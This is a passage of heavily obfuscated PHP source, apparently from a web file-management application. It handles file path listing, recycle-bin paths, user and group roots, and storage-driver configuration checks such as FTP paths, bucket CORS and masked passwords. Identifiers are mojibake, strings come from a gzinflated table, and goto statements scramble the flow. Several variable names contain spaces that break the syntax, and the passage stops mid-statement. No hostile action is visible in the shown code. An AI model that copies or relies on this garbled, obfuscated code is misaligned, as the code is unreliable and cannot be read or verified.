$šç§†ñ[12]; $ˆ€éÃ÷Ş = count($ã¹Ö¤) - $ğÇ²‡¨; for ($Ş§€ğ±Í = 0; $Ş§€ğ±Í < $ˆ€éÃ÷Ş; $Ş§€ğ±Í++) { if (!isset($Ëø¿şş¶[$ã¹Ö¤[$Ş§€ğ±Í]])) { $Õªœæ¾± = $šç§†ñ[12]; break; } $Õªœæ¾± = $Õªœæ¾± . rtrim($Ëø¿şş¶[$ã¹Ö¤[$Ş§€ğ±Í]], $šç§†ñ[8]) . $šç§†ñ[8]; } $—™´Şí[$šç§†ñ[499]][$šç§†ñ[595]] = rtrim($Õªœæ¾±, $šç§†ñ[8]) . $šç§†ñ[8]; break; } } unset($—™´Şí); } public function groupPathDisplay(&$Ï†ö¤ö£) { $õˆ…Ç÷÷ =& $_SERVER[‹‰”››ê]; if ($Ï†ö¤ö£[$õˆ…Ç÷÷[191]] != self::TYPE_GROUP) { return; } $ôÈ€¸ÑÕ = Model($õˆ…Ç÷÷[599])->getInfo($Ï†ö¤ö£[$õˆ…Ç÷÷[583]]); $“ŸÉˆÍ‡ = $this->parentLevelArray($ôÈ€¸ÑÕ[$õˆ…Ç÷÷[598]]); $ôåôŞ· = $õˆ…Ç÷÷[12]; foreach ($“ŸÉˆÍ‡ as $ÁÛ¤ã¿Ÿ) { $Èáñé‹• = Model($õˆ…Ç÷÷[599])->getInfo($ÁÛ¤ã¿Ÿ); $ôåôŞ· .= $Èáñé‹•[$õˆ…Ç÷÷[90]][$õˆ…Ç÷÷[194]] . $õˆ…Ç÷÷[50]; } $Ï†ö¤ö£[$õˆ…Ç÷÷[600]] = $ôÈ€¸ÑÕ[$õˆ…Ç÷÷[193]]; $Ï†ö¤ö£[$õˆ…Ç÷÷[601]] = $ôÈ€¸ÑÕ[$õˆ…Ç÷÷[598]]; $Ï†ö¤ö£[$õˆ…Ç÷÷[602]] = $ôÈ€¸ÑÕ[$õˆ…Ç÷÷[603]]; $Ï†ö¤ö£[$õˆ…Ç÷÷[604]] = $ôåôŞ· . $ôÈ€¸ÑÕ[$õˆ…Ç÷÷[90]][$õˆ…Ç÷÷[194]]; } protected function _listAppendPath(&$ƒ‰…İ, $˜ìò¨Ñ† = false) { $ñ›¬‡®ƒ =& $_SERVER[‹‰”››ê]; static $àÅ¸ÌŒ² = array(); $…‹Öá…é = array(); $“Í›‡•¯ = array(); if ($˜ìò¨Ñ†) { return $àÅ¸ÌŒ²; } foreach ($ƒ‰…İ as &$•ßÆÅü) { $ÚŸæĞğ» = $•ßÆÅü[$ñ›¬‡®ƒ[194]]; if ($•ßÆÅü[$ñ›¬‡®ƒ[497]] == $ñ›¬‡®ƒ[91] && $•ßÆÅü[$ñ›¬‡®ƒ[193]] != 0) { $àÅ¸ÌŒ²[$ÚŸæĞğ»] = $•ßÆÅü[$ñ›¬‡®ƒ[32]]; } if ($•ßÆÅü[$ñ›¬‡®ƒ[497]] == $ñ›¬‡®ƒ[91] && $•ßÆÅü[$ñ›¬‡®ƒ[193]] == 0) { $àÅ¸ÌŒ²[$ÚŸæĞğ»] = $this->_listAppendPathRoot($•ßÆÅü, array()); } if (isset($“Í›‡•¯[$•ßÆÅü[$ñ›¬‡®ƒ[598]]])) { continue; } $“Í›‡•¯[$•ßÆÅü[$ñ›¬‡®ƒ[598]]] = !0; $ïãÊ§»â = $this->parentLevelArray($•ßÆÅü[$ñ›¬‡®ƒ[598]]); foreach ($ïãÊ§»â as $®›ª‡Ñ„ => $ğú»öí§) { if (isset($àÅ¸ÌŒ²[$ğú»öí§])) { continue; } if ($®›ª‡Ñ„ == 0) { $àÅ¸ÌŒ²[$ğú»öí§] = $this->_listAppendPathRoot($•ßÆÅü, $ïãÊ§»â); } if ($®›ª‡Ñ„ != 0) { $…‹Öá…é[] = $ğú»öí§; } } } unset($•ßÆÅü); $…‹Öá…é = array_unique($…‹Öá…é); if (count($…‹Öá…é) > 0) { $±Œ´©‰© = array($ñ›¬‡®ƒ[503] => array($ñ›¬‡®ƒ[504], $…‹Öá…é)); if (count($…‹Öá…é) == 1) { $á‚ğàœ¥ = $this->sourceInfo($…‹Öá…é[0]); $¼ñÍí§ = is_array($á‚ğàœ¥) ? array($á‚ğàœ¥) : !1; } else { $¼ñÍí§ = $this->field($ñ›¬‡®ƒ[605])->where($±Œ´©‰©)->select(); } if (!$¼ñÍí§) { $¼ñÍí§ = array(); } foreach ($¼ñÍí§ as $Äƒñœ¢) { $àÅ¸ÌŒ²[$Äƒñœ¢[$ñ›¬‡®ƒ[194]]] = $Äƒñœ¢[$ñ›¬‡®ƒ[32]]; } } $êú­¢œŒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $–»½¡œ¡ = array(); foreach ($ƒ‰…İ as &$•ßÆÅü) { $¶³ìÍĞÚ = $•ßÆÅü[$ñ›¬‡®ƒ[598]]; $Úö‰Şë = $ñ›¬‡®ƒ[12]; if (isset($–»½¡œ¡[$¶³ìÍĞÚ])) { $Úö‰Şë = $–»½¡œ¡[$¶³ìÍĞÚ]; } else { $ïãÊ§»â = $this->parentLevelArray($•ßÆÅü[$ñ›¬‡®ƒ[598]]); foreach ($ïãÊ§»â as $®›ª‡Ñ„ => $ğú»öí§) { if (isset($àÅ¸ÌŒ²[$ğú»öí§])) { $Úö‰Şë .= $àÅ¸ÌŒ²[$ğú»öí§] . $ñ›¬‡®ƒ[8]; } } $–»½¡œ¡[$¶³ìÍĞÚ] = $Úö‰Şë; } $Úö‰Şë .= $•ßÆÅü[$ñ›¬‡®ƒ[32]]; if ($•ßÆÅü[$ñ›¬‡®ƒ[497]] == $ñ›¬‡®ƒ[91]) { $Úö‰Şë .= $ñ›¬‡®ƒ[8]; } $•ßÆÅü[$ñ›¬‡®ƒ[596]] = str_replace($ñ›¬‡®ƒ[257], $ñ›¬‡®ƒ[8], $Úö‰Şë); if ($•ßÆÅü[$ñ›¬‡®ƒ[193]] == $ñ›¬‡®ƒ[231]) { $•ßÆÅü[$ñ›¬‡®ƒ[32]] = trim($àÅ¸ÌŒ²[$•ßÆÅü[$ñ›¬‡®ƒ[194]]], $ñ›¬‡®ƒ[8]); $•ßÆÅü[$ñ›¬‡®ƒ[596]] = $•ßÆÅü[$ñ›¬‡®ƒ[32]] . $ñ›¬‡®ƒ[8]; } if (intval($•ßÆÅü[$ñ›¬‡®ƒ[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($•ßÆÅü, $ïãÊ§»â, $êú­¢œŒ); } } unset($•ßÆÅü); return $ƒ‰…İ; } private function _listAppendPathRecycle(&$Ü®¾¼½, $¶ƒˆ¯š©, $–º«±öó) { $ÒÙåƒèà =& $_SERVER[‹‰”››ê]; if (!in_array($–º«±öó, $¶ƒˆ¯š©) && $Ü®¾¼½[$ÒÙåƒèà[194]] != $–º«±öó) { return; } $Ñ¿²Ê”Ñ = explode($ÒÙåƒèà[8], trim($Ü®¾¼½[$ÒÙåƒèà[596]], $ÒÙåƒèà[8])); $ß¼ÌŞ¨÷ = implode($ÒÙåƒèà[8], array_slice($Ñ¿²Ê”Ñ, 2)); $Ü®¾¼½[$ÒÙåƒèà[596]] = $ÒÙåƒèà[8] . LNG($ÒÙåƒèà[606]) . $ÒÙåƒèà[8] . ltrim($ß¼ÌŞ¨÷, $ÒÙåƒèà[8]); $Ü®¾¼½[$ÒÙåƒèà[598]] = $ÒÙåƒèà[607] . implode($ÒÙåƒèà[50], array_slice($¶ƒˆ¯š©, 1)) . $ÒÙåƒèà[50]; if ($Ü®¾¼½[$ÒÙåƒèà[194]] == $–º«±öó) { $Ü®¾¼½[$ÒÙåƒèà[598]] = $ÒÙåƒèà[607]; $Ü®¾¼½[$ÒÙåƒèà[193]] = $ÒÙåƒèà[231]; $Ü®¾¼½[$ÒÙåƒèà[32]] = LNG($ÒÙåƒèà[606]); } $Ü®¾¼½[$ÒÙåƒèà[608]] = $ÒÙåƒèà[609]; } protected function _listAppendPathRoot(&$èœÚ‡¬º, $³ñ¼Äİ–) { $ß•İ¯Ò =& $_SERVER[‹‰”››ê]; static $òãÆÕø® = false; static $–²¿¼Ã‚ = false; $ÔÂœ÷•ã = $ß•İ¯Ò[12]; if ($èœÚ‡¬º[$ß•İ¯Ò[191]] == self::TYPE_USER) { if ($èœÚ‡¬º[$ß•İ¯Ò[583]] == USER_ID) { $ÔÂœ÷•ã = LNG($ß•İ¯Ò[610]); if ($òãÆÕø® === !1) { $–ˆ×ÖÀ« = Model($ß•İ¯Ò[611])->getInfoFull(USER_ID); $òãÆÕø® = _get($–ˆ×ÖÀ«, $ß•İ¯Ò[612], $ß•İ¯Ò[12]); } if ($–²¿¼Ã‚ === !1) { $–ˆ×ÖÀ« = Model($ß•İ¯Ò[611])->getInfoFull(USER_ID); $–²¿¼Ã‚ = _get($–ˆ×ÖÀ«, $ß•İ¯Ò[613], $ß•İ¯Ò[12]); } if ($³ñ¼Äİ– && $³ñ¼Äİ–[0] == $òãÆÕø® || !$³ñ¼Äİ– && $èœÚ‡¬º[$ß•İ¯Ò[194]] == $òãÆÕø®) { $ÔÂœ÷•ã = LNG($ß•İ¯Ò[614]); $èœÚ‡¬º[$ß•İ¯Ò[615]] = $ß•İ¯Ò[616]; } if ($³ñ¼Äİ– && $³ñ¼Äİ–[0] == $–²¿¼Ã‚ || !$³ñ¼Äİ– && $èœÚ‡¬º[$ß•İ¯Ò[194]] == $–²¿¼Ã‚) { $ÔÂœ÷•ã = $ÔÂœ÷•ã . $ß•İ¯Ò[617] . LNG($ß•İ¯Ò[618]); } if (!$³ñ¼Äİ–) { $èœÚ‡¬º[$ß•İ¯Ò[32]] = $ÔÂœ÷•ã; } } else { $–ˆ×ÖÀ« = Model($ß•İ¯Ò[611])->getInfoFull($èœÚ‡¬º[$ß•İ¯Ò[583]]); $òÎ½îÎ³ = _get($–ˆ×ÖÀ«, $ß•İ¯Ò[613], $ß•İ¯Ò[12]); $èœÚ‡¬º[$ß•İ¯Ò[619]] = Model($ß•İ¯Ò[591])->getInfoSimpleOuter($èœÚ‡¬º[$ß•İ¯Ò[583]]); $ÔÂœ÷•ã = LNG($ß•İ¯Ò[620]) . $ß•İ¯Ò[176] . $èœÚ‡¬º[$ß•İ¯Ò[619]][$ß•İ¯Ò[32]] . $ß•İ¯Ò[178]; if ($³ñ¼Äİ– && $³ñ¼Äİ–[0] == $òÎ½îÎ³ || !$³ñ¼Äİ– && $èœÚ‡¬º[$ß•İ¯Ò[194]] == $òÎ½îÎ³) { $ÔÂœ÷•ã = LNG($ß•İ¯Ò[620]) . $ß•İ¯Ò[621] . $èœÚ‡¬º[$ß•İ¯Ò[619]][$ß•İ¯Ò[32]] . $ß•İ¯Ò[617] . LNG($ß•İ¯Ò[618]) . $ß•İ¯Ò[178]; } } } else { if ($èœÚ‡¬º[$ß•İ¯Ò[191]] == self::TYPE_GROUP) { $ĞÆúÆô = Model($ß•İ¯Ò[599])->getInfoSimple($èœÚ‡¬º[$ß•İ¯Ò[583]]); $ÔÂœ÷•ã = $ĞÆúÆô[$ß•İ¯Ò[32]]; } else { if ($èœÚ‡¬º[$ß•İ¯Ò[191]] == self::TYPE_SYSTEM) { $ÔÂœ÷•ã = $ß•İ¯Ò[622]; } } } $ÔÂœ÷•ã = $ÔÂœ÷•ã ? $ß•İ¯Ò[8] . $ÔÂœ÷•ã . $ß•İ¯Ò[8] : $ß•İ¯Ò[8]; return $ÔÂœ÷•ã; } protected function _listAppendUser(&$ıøïµØ) { $—¢œ©åà =& $_SERVER[‹‰”››ê]; $ê•«±²Ê = array_to_keyvalue($ıøïµØ, $—¢œ©åà[12], $—¢œ©åà[539]); $Óš±¼¼ş = array_to_keyvalue($ıøïµØ, $—¢œ©åà[12], $—¢œ©åà[541]); $ì¸á¸ÊÄ = array_merge($ê•«±²Ê, $Óš±¼¼ş); $±ñŞÌöØ = Model($—¢œ©åà[611])->userListInfo($ì¸á¸ÊÄ); foreach ($ıøïµØ as &$ª²ğí¢¼) { $ñ¨ùç = $ª²ğí¢¼[$—¢œ©åà[539]]; $ª²ğí¢¼[$—¢œ©åà[539]] = $±ñŞÌöØ[$ñ¨ùç] ? $±ñŞÌöØ[$ñ¨ùç] : !1; $ñ¨ùç = $ª²ğí¢¼[$—¢œ©åà[541]]; $ª²ğí¢¼[$—¢œ©åà[541]] = $±ñŞÌöØ[$ñ¨ùç] ? $±ñŞÌöØ[$ñ¨ùç] : !1; if (_get($ª²ğí¢¼, $—¢œ©åà[623], 0)) { $Æ€³°Èö = $GLOBALS[$—¢œ©åà[6]][$—¢œ©åà[92]][$—¢œ©åà[624]]; if ($ª²ğí¢¼[$—¢œ©åà[553]][$—¢œ©åà[625]] <= time() - $Æ€³°Èö) { $this->metaSet($ª²ğí¢¼[$—¢œ©åà[194]], $—¢œ©åà[626], null); $this->metaSet($ª²ğí¢¼[$—¢œ©åà[194]], $—¢œ©åà[625], null); unset($ª²ğí¢¼[$—¢œ©åà[553]][$—¢œ©åà[626]]); continue; } $×” – = $ª²ğí¢¼[$—¢œ©åà[553]][$—¢œ©åà[626]]; $ª²ğí¢¼[$—¢œ©åà[553]][$—¢œ©åà[627]] = Model($—¢œ©åà[611])->getInfoSimpleOuter($×” –); } } unset($ª²ğí¢¼); } public function parentLevelArray($¡¡¢–÷¹) { $„ëÍıû =& $_SERVER[‹‰”››ê]; $¡¡¢–÷¹ = explode($„ëÍıû[50], trim($¡¡¢–÷¹, $„ëÍıû[50])); return array_remove_value($¡¡¢–÷¹, $„ëÍıû[231]); } public function listAll($ú¡½èÌî) { $›„Ÿ‚¯› =& $_SERVER[‹‰”››ê]; $ÚüÊ‘Ïª = $this->sourceInfo($ú¡½èÌî); $´–Êñš = array($›„Ÿ‚¯›[628] => array($›„Ÿ‚¯›[629], $ÚüÊ‘Ïª[$›„Ÿ‚¯›[598]] . $ú¡½èÌî . $›„Ÿ‚¯›[630]), $›„Ÿ‚¯›[631] => 0); $ä û¾†€ = $›„Ÿ‚¯›[632]; $ÊÚë†Ù‰ = "\114\x45\106\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x66\x69\154\x65\x20\146\151\154\145\40\157\x6e\x20\x73\157\x75\x72\x63\x65\56\x66\151\x6c\x65\x49\x44\x20\x3d\40\146\151\154\x65\56\x66\151\154\x65\x49\104"; $•ºÃ¬ÓÈ = $this->alias($›„Ÿ‚¯›[531])->field($ä û¾†€)->where($´–Êñš)->join($ÊÚë†Ù‰)->select(); $this->_listAppendAuth($•ºÃ¬ÓÈ); $this->_listAppendUser($•ºÃ¬ÓÈ); $this->_listAppendPath($•ºÃ¬ÓÈ); $•ºÃ¬ÓÈ = array_to_keyvalue($•ºÃ¬ÓÈ, $›„Ÿ‚¯›[194]); $ñ²½Ã‘Œ = "\57{$ÚüÊ‘Ïª[$›„Ÿ‚¯›[32]]}\x2f"; $ñ²½Ã‘Œ = $ñ²½Ã‘Œ == $›„Ÿ‚¯›[257] ? $›„Ÿ‚¯›[8] : $ñ²½Ã‘Œ; $ıÊìÀé— = array(); foreach ($•ºÃ¬ÓÈ as $ù ‚æ§Ù => $‰Ö²¾ˆ) { $Ï£êğÎ¬ = $this->parentLevelArray($‰Ö²¾ˆ[$›„Ÿ‚¯›[598]]); array_shift($Ï£êğÎ¬); $„÷Ÿñ = $ñ²½Ã‘Œ; for ($ÇÉîÛû¢ = 0; $ÇÉîÛû¢ < count($Ï£êğÎ¬); $ÇÉîÛû¢++) { $„÷Ÿñ .= $•ºÃ¬ÓÈ[$Ï£êğÎ¬[$ÇÉîÛû¢]][$›„Ÿ‚¯›[32]] . $›„Ÿ‚¯›[8]; } $„÷Ÿñ .= $‰Ö²¾ˆ[$›„Ÿ‚¯›[32]]; if ($‰Ö²¾ˆ[$›„Ÿ‚¯›[497]]) { $„÷Ÿñ .= $›„Ÿ‚¯›[8]; } $âó¾…†¿ = array($›„Ÿ‚¯›[507] => str_replace($›„Ÿ‚¯›[257], $›„Ÿ‚¯›[8], str_replace($›„Ÿ‚¯›[257], $›„Ÿ‚¯›[8], str_replace($›„Ÿ‚¯›[257], $›„Ÿ‚¯›[8], $„÷Ÿñ))), $›„Ÿ‚¯›[633] => intval($‰Ö²¾ˆ[$›„Ÿ‚¯›[497]]), $›„Ÿ‚¯›[634] => intval($‰Ö²¾ˆ[$›„Ÿ‚¯›[79]]), $›„Ÿ‚¯›[88] => intval($‰Ö²¾ˆ[$›„Ÿ‚¯›[88]]), $›„Ÿ‚¯›[90] => $this->pathInfoFilter($‰Ö²¾ˆ)); if (!$âó¾…†¿[$›„Ÿ‚¯›[497]]) { $âó¾…†¿[$›„Ÿ‚¯›[555]] = $‰Ö²¾ˆ[$›„Ÿ‚¯›[555]]; } $ıÊìÀé—[] = $âó¾…†¿; } $ıÊìÀé— = array_sort_by($ıÊìÀé—, $›„Ÿ‚¯›[87]); return $ıÊìÀé—; } } goto Eøøàå·ğÀ; FÛºÏ¿¥˜Å: define($_SERVER[‹‰”››ê][0], $_SERVER[‹‰”››ê][1]); $_SERVER[ÓÎ®ç»•] = explode($_SERVER[‹‰”››ê][2], gzinflate(substr($_SERVER[‹‰”››ê][3], 10, -8))); function binCheckEq($ƒÒáªÚ÷, $”‰ ëƒæ) { return $ƒÒáªÚ÷ == $”‰ ëƒæ; } goto f‹§¨Óò; FÅÉ¬Ö£è¤: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x73\x6f\165\x72\143\x65\123\145\143\162\145\164\114\x69\163\x74"; public $field = array("\163\157\x75\x72\x63\x65\x49\104", "\x74\171\160\x65\x49\104", "\143\x72\x65\x61\164\145\125\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x73\x74\x6f\x72\141\x67\145\114\151\x73\164"; public $field = array("\x6e\141\155\x65", "\x73\x69\x7a\x65\115\x61\x78", "\163\x79\x73\x74\x65\155", "\x64\x65\x66\x61\x75\154\x74", "\144\162\x69\x76\x65\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($íÖŒµÀ = false, $âÙİÍ§Ú = "\x6d\157\x64\x69\x66\x79\124\x69\155\x65", $ÉÒŞ€ = false) { $ƒâ‚œã¬ =& $_SERVER[‹‰”››ê]; $²‚½³©° = parent::listData($íÖŒµÀ, $âÙİÍ§Ú, $ÉÒŞ€); if ($íÖŒµÀ) { return $²‚½³©°; } $óÎ¤¹ = array(); if ($GLOBALS[$ƒâ‚œã¬[2329]]) { $óÎ¤¹ = $this->ioSizeUseGet(array_to_keyvalue($²‚½³©°, $ƒâ‚œã¬[12], $ƒâ‚œã¬[487])); } foreach ($²‚½³©° as $şºú®İ‹ => $–›·€¨‚) { unset($²‚½³©°[$şºú®İ‹][$ƒâ‚œã¬[6]]); $²‚½³©°[$şºú®İ‹][$ƒâ‚œã¬[1980]] = isset($óÎ¤¹[$–›·€¨‚[$ƒâ‚œã¬[487]]]) ? $óÎ¤¹[$–›·€¨‚[$ƒâ‚œã¬[487]]] : 0; } return $²‚½³©°; } public function ioSizeUseGet($ËÇ‚Êæ) { $ŞŞ¾Ñ±† =& $_SERVER[‹‰”››ê]; if (!$ËÇ‚Êæ) { return array(); } $¯’‰û‰ƒ = $ŞŞ¾Ñ±†[2330] . implode($ŞŞ¾Ñ±†[50], $ËÇ‚Êæ); $çªìÅŸõ = Cache::get($¯’‰û‰ƒ); if ($çªìÅŸõ) { return $çªìÅŸõ; } $Œ—š° ¼ = array($ŞŞ¾Ñ±†[913] => $ŞŞ¾Ñ±†[487], $ŞŞ¾Ñ±†[2331] => $ŞŞ¾Ñ±†[79]); $„¬™â×Î = array($ŞŞ¾Ñ±†[913] => array($ŞŞ¾Ñ±†[7], $ËÇ‚Êæ)); $çªìÅŸõ = Model($ŞŞ¾Ñ±†[881])->field($Œ—š° ¼)->where($„¬™â×Î)->group($ŞŞ¾Ñ±†[913])->select(); $çªìÅŸõ = array_to_keyvalue($çªìÅŸõ, $ŞŞ¾Ñ±†[487], $ŞŞ¾Ñ±†[79]); Cache::set($¯’‰û‰ƒ, $çªìÅŸõ, 600); return $çªìÅŸõ; } public function getConfig($ÕÎ‹˜ı÷) { $…öá¿­Ú = parent::listData($ÕÎ‹˜ı÷); $Ÿ–ô‹”ó = _get($…öá¿­Ú, $_SERVER[‹‰”››ê][6], array()); if ($Ÿ–ô‹”ó && !is_array($Ÿ–ô‹”ó)) { $Ÿ–ô‹”ó = json_decode($Ÿ–ô‹”ó, !0); } return $Ÿ–ô‹”ó; } public function update($Ğñ´´åğ, $–Ë»ß ¾) { $Ç Û¨Õ¸ =& $_SERVER[‹‰”››ê]; $Óí¹»Ñ¡ = $–Ë»ß ¾[$Ç Û¨Õ¸[32]]; $öæÔ´÷ = array_to_keyvalue(parent::listData(), $Ç Û¨Õ¸[32]); if (isset($öæÔ´÷[$Óí¹»Ñ¡]) && $öæÔ´÷[$Óí¹»Ñ¡][$Ç Û¨Õ¸[487]] != $Ğñ´´åğ) { return !1; } $this->checkPwd($Ğñ´´åğ, $–Ë»ß ¾); if (isset($–Ë»ß ¾[$Ç Û¨Õ¸[2332]]) && $–Ë»ß ¾[$Ç Û¨Õ¸[2332]] == $Ç Û¨Õ¸[91]) { $this->checkConfig($–Ë»ß ¾); } unset($–Ë»ß ¾[$Ç Û¨Õ¸[2332]]); $¡û£ì†ä = parent::update($Ğñ´´åğ, $–Ë»ß ¾); if ($¡û£ì†ä && $–Ë»ß ¾[$Ç Û¨Õ¸[37]]) { $”ÃØ£¥´ = 0; foreach ($öæÔ´÷ as $ª˜Ë) { if ($ª˜Ë[$Ç Û¨Õ¸[37]] && $ª˜Ë[$Ç Û¨Õ¸[487]] != $Ğñ´´åğ) { $”ÃØ£¥´ = $ª˜Ë[$Ç Û¨Õ¸[487]]; parent::update($ª˜Ë[$Ç Û¨Õ¸[487]], array($Ç Û¨Õ¸[37] => 0)); } } $this->updateBackup($Ğñ´´åğ, $”ÃØ£¥´); } return $¡û£ì†ä; } public function add($›‰âËşÉ) { $ëĞæÈåõ =& $_SERVER[‹‰”››ê]; $Û×áå¢œ = array_to_keyvalue(parent::listData(), $ëĞæÈåõ[32]); if (isset($Û×áå¢œ[$›‰âËşÉ[$ëĞæÈåõ[32]]])) { return !1; } $this->checkConfig($›‰âËşÉ); $šÓµéÄƒ = parent::insert($›‰âËşÉ); if ($šÓµéÄƒ && $›‰âËşÉ[$ëĞæÈåõ[37]]) { foreach ($Û×áå¢œ as $áé°™‚˜) { if ($áé°™‚˜[$ëĞæÈåõ[37]]) { parent::update($áé°™‚˜[$ëĞæÈåõ[487]], array($ëĞæÈåõ[37] => 0)); } } } return $šÓµéÄƒ; } public function updateBackup($šĞ¯ ê, $»¿Š·Ï½) { $ã‘Á­Ù =& $_SERVER[‹‰”››ê]; if (!$»¿Š·Ï½) { return; } $²•´¾ = Model($ã‘Á­Ù[838])->config(); if ($²•´¾[$ã‘Á­Ù[1760]] != $ã‘Á­Ù[91] || $²•´¾[$ã‘Á­Ù[842]] != $»¿Š·Ï½) { return; } $à†µ´×“ = Model($ã‘Á­Ù[860])->get($ã‘Á­Ù[867]); $à†µ´×“ = json_decode($à†µ´×“, !0); if (!$à†µ´×“) { return; } $à†µ´×“[$ã‘Á­Ù[842]] = $šĞ¯ ê; Model($ã‘Á­Ù[860])->set(array($ã‘Á­Ù[867] => $à†µ´×“)); } public function checkPwd($ğŞéÜŞ·, &$ôÇÆ³²ù) { $¸ì–‰á• =& $_SERVER[‹‰”››ê]; if (empty($ôÇÆ³²ù[$¸ì–‰á•[6]])) { return; } $¢ûÀûç· = $ôÇÆ³²ù[$¸ì–‰á•[6]]; if (!is_array($¢ûÀûç·)) { $¢ûÀûç· = json_decode($¢ûÀûç·, !0); } $ÛÆ‘½’² = $¸ì–‰á•[12]; $ÕÓÖ˜ï = array($¸ì–‰á•[2333], $¸ì–‰á•[2334], $¸ì–‰á•[982]); foreach ($ÕÓÖ˜ï as $Î§ñ¡òí) { if (isset($¢ûÀûç·[$Î§ñ¡òí])) { $ÛÆ‘½’² = $Î§ñ¡òí; break; } } if (!$ÛÆ‘½’²) { return; } $­îÑØ…Ş = $this->getConfig($ğŞéÜŞ·); $¹ë”Ñ¨ = $­îÑØ…Ş[$ÛÆ‘½’²]; $˜’ÜñÖ = $¢ûÀûç·[$ÛÆ‘½’²]; if ($˜’ÜñÖ == str_repeat($¸ì–‰á•[223], strlen($¹ë”Ñ¨))) { $¢ûÀûç·[$ÛÆ‘½’²] = $¹ë”Ñ¨; $ôÇÆ³²ù[$¸ì–‰á•[6]] = json_encode($¢ûÀûç·); } else { if ($˜’ÜñÖ != $¹ë”Ñ¨) { $ôÇÆ³²ù[$¸ì–‰á•[2332]] = $¸ì–‰á•[91]; } } } public function checkConfig(&$¥Óª, $õ¿ö•£’ = false) { $ùˆƒäÁÔ =& $_SERVER[‹‰”››ê]; $Ğ‡È£½› = strtolower($¥Óª[$ùˆƒäÁÔ[98]]); $ğÚ¬ıÀ— = $¥Óª[$ùˆƒäÁÔ[6]]; if (!is_array($ğÚ¬ıÀ—)) { $ğÚ¬ıÀ— = json_decode($ğÚ¬ıÀ—, !0); } foreach ($ğÚ¬ıÀ— as $É£Åıá¹ => $å‚÷®º) { if (is_string($å‚÷®º)) { $ğÚ¬ıÀ—[$É£Åıá¹] = trim($å‚÷®º); } } $ğÚ¬ıÀ—[$ùˆƒäÁÔ[2335]] = rand_string(6); $ç±Œæ = $GLOBALS[$ùˆƒäÁÔ[6]][$ùˆƒäÁÔ[92]][$ùˆƒäÁÔ[921]]; $ÊÔ›„ìË = isset($ç±Œæ[$Ğ‡È£½›]) ? $ç±Œæ[$Ğ‡È£½›] : ucfirst($Ğ‡È£½›); $Ãƒ¥£Ìƒ = $ùˆƒäÁÔ[77] . $ÊÔ›„ìË; if (!$ÊÔ›„ìË || !class_exists($Ãƒ¥£Ìƒ)) { if ($õ¿ö•£’) { return LNG($ùˆƒäÁÔ[2336]); } write_log(array($ùˆƒäÁÔ[2337], $¥Óª, get_caller_info()), $ùˆƒäÁÔ[216]); show_json(LNG($ùˆƒäÁÔ[2336]), !1, $¥Óª); } $ìÄÓ£•ğ = new $Ãƒ¥£Ìƒ($ğÚ¬ıÀ—); $ËöóÙáç = rtrim($ğÚ¬ıÀ—[$ùˆƒäÁÔ[1278]], $ùˆƒäÁÔ[8]) . $ùˆƒäÁÔ[8]; if (in_array($Ğ‡È£½›, $ìÄÓ£•ğ->objectDriver)) { try { if (!$ìÄÓ£•ğ->isBucketCors() && !$ìÄÓ£•ğ->setBucketCors()) { $Áä÷Í–Ë = LNG($ùˆƒäÁÔ[2338]); $Áä÷Í–Ë .= $ùˆƒäÁÔ[2339] . LNG($ùˆƒäÁÔ[2340]); } } catch (Exception $×Š Êì ) { $Áä÷Í–Ë = $×Š Êì ->getMessage(); } if (isset($Áä÷Í–Ë)) { return $this->_parseError($Áä÷Í–Ë, $Ğ‡È£½›, $õ¿ö•£’); } if ($Ğ‡È£½› == $ùˆƒäÁÔ[68] && !$ìÄÓ£•ğ->checkRegion()) { return $this->_parseError(LNG($ùˆƒäÁÔ[2341]), $Ğ‡È£½›, $õ¿ö•£’); } } else { if ($Ğ‡È£½› == $ùˆƒäÁÔ[2342]) { if ($ìÄÓ£•ğ->ftpPath) { $‹Ñİã® = trim($ËöóÙáç, $ùˆƒäÁÔ[8]); if (stripos($‹Ñİã®, trim($ìÄÓ£•ğ->ftpPath, $ùˆƒäÁÔ[8])) !== 0) { $ËöóÙáç = $ìÄÓ£•ğ->ftpPath . $ùˆƒäÁÔ[8] . ($‹Ñİã® ? $‹Ñİã® . $ùˆƒäÁÔ[8] : $ùˆƒäÁÔ[12]); } } } } $³ıæÛáò = $ìÄÓ£•ğ->getPath($ËöóÙáç . $ùˆƒäÁÔ[1282]); try { if ($Ğ‡È£½› == $ùˆƒäÁÔ[109]) { $ìÄÓ£•ğ->mkdir($ËöóÙáç); } $‚æ¸ŒÄÚ = $ìÄÓ£•ğ->mkfile($³ıæÛáò); if (!$‚æ¸ŒÄÚ) { $Áä÷Í–Ë = LNG($ùˆƒäÁÔ[2338]); } } catch (Exception $×Š Êì ) { $Áä÷Í–Ë = $×Š Êì ->getMessage(); } if (isset($Áä÷Í–Ë)) { return $this->_parseError($Áä÷Í–Ë, $Ğ‡È£½›, $õ¿ö•£’); } $ğÚ¬ıÀ—[$ùˆƒäÁÔ[1278]] = $ËöóÙáç; $¥Óª[$ùˆƒäÁÔ[6]] = json_encode($ğÚ¬ıÀ—); $¥Óª[$ùˆƒäÁÔ[98]] = $ÊÔ›„ìË; return !0; } private function _parseError($Ò¸Ãõ¥ƒ, $¬ÎáÓìÏ, $ºóÈÍôî = false) { $¬­ëÄÜš =& $_SERVER[‹‰”››ê]; if ($¬ÎáÓìÏ == $¬­ëÄÜš[68] && stripos($Ò¸Ãõ¥ƒ, $¬­ëÄÜš[2343])) { $ÛŞ¬ùô = explode($¬­ëÄÜš[10], $Ò¸Ãõ¥ƒ); $”åÂ½şŠ = isset($ÛŞ¬ùô[1]) ? $ÛŞ¬ùô[1] : $¬­ëÄÜš[12]; $…‹’ó = array($¬­ëÄÜš[2344] => LNG($¬­ëÄÜš[2345]), $¬­ëÄÜš[2346] => LNG($¬­ëÄÜš[2347])); if (isset($…‹’ó[$”åÂ½şŠ])) { $Ò¸Ãõ¥ƒ = $…‹’ó[$”åÂ½şŠ]; } } if (stripos($Ò¸Ãõ¥ƒ, $¬­ëÄÜš[2348]) === 0) { $Ñ›ÊÓƒÛ = strpos($Ò¸Ãõ¥ƒ, $¬­ëÄÜš[178]); if ($Ñ›ÊÓƒÛ === !1) { $Ñ›ÊÓƒÛ 